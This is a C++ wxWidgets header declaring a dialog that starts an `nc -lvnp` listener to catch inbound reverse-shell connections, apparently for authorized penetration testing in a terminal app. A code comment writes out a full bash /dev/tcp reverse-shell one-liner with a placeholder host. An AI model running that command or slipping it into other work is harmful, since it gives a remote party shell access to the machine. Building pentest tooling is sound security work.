#pragma once

#include <wx/wx.h>
#include <wx/spinctrl.h>

// Collects a local port (and optional bind address) to listen on for an
// inbound reverse-shell connection, e.g. from an authorized pentest target
// running `bash -i >& /dev/tcp/<termx-host>/<port> 0>&1` or similar. Reuses
// the system's `nc` in listen mode as the spawned command, so the accepted
// connection's I/O appears live in a normal TerminalPanel tab exactly like
// running `nc -lvnp <port>` in a terminal.
class ReverseShellDialog : public wxDialog
{
public:
    explicit ReverseShellDialog(wxWindow* parent);

    // {"nc", "-l", "-v", "-n", "-p", port, [bindAddress]}
    wxArrayString GetArgv() const;

    wxString GetTabTitle() const;

private:
    void OnOk(wxCommandEvent& event);

    wxSpinCtrl* m_port = nullptr;
    wxTextCtrl* m_bindAddress = nullptr;
};
